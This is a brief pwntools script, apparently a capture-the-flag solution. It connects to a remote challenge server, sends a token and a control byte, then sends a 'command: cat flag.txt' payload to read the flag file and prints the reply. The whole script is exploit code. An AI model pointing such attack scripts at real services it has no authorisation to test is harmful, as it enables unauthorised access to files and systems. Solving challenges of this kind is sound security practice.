from pwn import *

if __name__ == "__main__":
    io = remote("138.68.147.232", 30887)
    io.send("e2162a8692df4e158e6fd33d1467dfe0")

    payload = "command: cat flag.txt"
    io.send(b"\x15") 
    io.sendline(payload)

    print(io.recv(1024))
